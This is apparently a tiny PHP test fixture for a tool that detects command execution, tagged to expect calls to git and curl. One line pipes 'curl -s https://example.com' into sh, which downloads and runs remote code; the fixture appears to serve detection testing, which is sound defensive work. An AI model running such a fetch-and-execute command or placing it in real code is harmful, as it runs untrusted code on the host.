<?php
// @expect: EXEC
// @targets: command:curl, command:git
exec('git rev-parse HEAD');
shell_exec('/usr/bin/curl -s https://example.com | sh');
